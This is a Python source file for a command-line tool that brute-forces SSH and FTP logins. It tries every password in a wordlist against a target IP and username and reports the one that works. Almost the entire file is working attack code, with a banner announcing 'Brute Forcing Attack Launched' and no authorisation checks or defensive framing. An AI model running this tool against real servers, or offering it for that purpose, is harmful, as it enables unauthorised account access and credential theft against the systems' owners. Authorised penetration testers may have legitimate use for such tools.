from pathlib import Path
from pexpect import pxssh
from colorama import Fore, init
import datetime
import argparse
import ftplib


init(autoreset=False)


class BruteForceSSHFTP():
    def __init__(self):
        self.server = ""
        self.username = ""
        self.wordlist = []
        self.server_port = 22
        self.timeout = 5
        self.mod = ""

    def banner(self):
        if self.mod == "ssh":
            timeout_text = f"Target Timeout: {str(self.timeout)}"
        else:
            timeout_text = ""
        print("""
        █▀█ █▄█ ▀█▀ █░█ █▀█ █▄░█   █▀▀ █▀█ █▀█   █░█ █░█ █▀▀ █▄▀ █▀█ █▀
        █▀▀ ░█░ ░█░ █▀█ █▄█ █░▀█   █▀░ █▄█ █▀▄   █▀█ ▀▀█ █▄▄ █░█ █▀▄ ▄█

                                                𝖌𝖎𝖙𝖍𝖚𝖇 𝖆𝖑𝖎𝖎76𝖙𝖙
        """)
        print("-"*67)
        print(f"""
                    Bʀᴜᴛᴇ Fᴏʀᴄɪɴɢ SSH-FTP\n
        START_TIME: {datetime.datetime.ctime(datetime.datetime.now())}
        Target Ip: {self.server}
        Target Username: {self.username}
        MOD: {self.mod}
        WORDLIST_FILES: {self.wordlist}
        Target Port: {self.server_port}
        {timeout_text}
        """)
        print("-"*67)
        print(
            f"--> Brute Forcing Attack Launched [{self.mod}]: {self.server} <--\n")

    def connectSSH(self, hostname, username, wordlist, port, timeout):
        wordlist = open(wordlist, "r")
        for password in wordlist:
            password = password.strip("\n")
            try:
                ssh = pxssh.pxssh(timeout=timeout)
                ssh.login(hostname, username, password, port)
                print(Fore.GREEN +
                      "[+] Login successfuly. Password: " + password)
                print(Fore.LIGHTCYAN_EX +
                      "[~] End: The processing has been finished.")
                exit()
            except pxssh.ExceptionPxssh:
                print(Fore.LIGHTRED_EX +
                      "[-] Password Refused. Wrong Password: " + password)

        print(Fore.LIGHTCYAN_EX +
              "[~] End: The processing has been finished. Password Not Found!")

    def connectFTP(self, hostname, username, wordlist):
        wordlist = open(wordlist, "r")

        for password in wordlist:
            password = password.strip("\n")
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print(Fore.GREEN +
                      "[+] Login successfuly. Password: " + password)
                print(Fore.LIGHTCYAN_EX +
                      "[~] End: The processing has been finished.")
                exit()
            except ftplib.error_perm as e:
                print(Fore.LIGHTRED_EX +
                      f"[-] {e} Wrong Password: " + password)
            except ConnectionRefusedError:
                print(Fore.LIGHTRED_EX +
                      "[~] Connection refused. FTP Port close.")
                exit()
        print(Fore.LIGHTCYAN_EX +
              "[~] End: The processing has been finished. Password Not Found!")

    def main(self):
        ap = argparse.ArgumentParser(add_help=False)
        ap.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS,
                        help="""[*] Target IP Address (-i): Must be specified\n[*] Target Username (-u): Must be specified\n[*] Attack Mod (-M): Must be specified\nPort (-p): Target Port(Default:22)\Timeout (-t): Timeout (Default:5)\nWordList (-w): Enter your wordlist (use `-w -` for stdin)\n\n-----------\nUsage: python main.py -i <ip> -u <username> -M <mod> -w <wordlist>""")
        ap.add_argument('-i', '--ip', dest='server',
                        help='Target IP Address', required=True)
        ap.add_argument('-u', '--username',
                        dest='username', help='SSH User name')
        ap.add_argument('-M', '--mod', type=str,
                        dest='mod', help='ssh or ftp', required=True)
        ap.add_argument('-p', '--port', default=22, type=int,
                        dest='server_port', help='Target Port Number (Default 22)')
        ap.add_argument('-t', '--timeout', default=5,
                        type=int, dest='timeout', help='Request timeout (Default 5)')
        ap.add_argument('-w', '--wordlist', type=Path,
                        default="wordlist.txt", dest='wordlist', help='Passwords File Path Default(wordlist.txt)')

        args = vars(ap.parse_args())
        if args['server'] and args['username'] and args['mod']:
            try:
                self.server = args['server']
                self.username = args['username']
                self.wordlist = args['wordlist']
                self.server_port = args['server_port']
                self.timeout = args['timeout']
                self.mod = args['mod']

                self.banner()
                if args['mod'] == "ssh":
                    self.connectSSH(self.server, self.username,
                                    self.wordlist, self.server_port, self.timeout)
                elif args['mod'] == "ftp":
                    self.connectFTP(self.server, self.username,
                                    self.wordlist)
                else:
                    print(Fore.RED + "UNKOWN MOD!\n".center(50))
                    print(ap.print_help())
            except FileNotFoundError:
                print(Fore.RED +
                      f"[~] Error: -FileNotFoundError- Please check your wordlist path. Wordlist: {args['wordlist']}")
            except KeyboardInterrupt:
                print(Fore.LIGHTCYAN_EX +
                      "\n[~] End: You have pressed ctrl-c button.")
        else:
            print(ap.print_help())


if __name__ == '__main__':
    main = BruteForceSSHFTP()
    main.main()
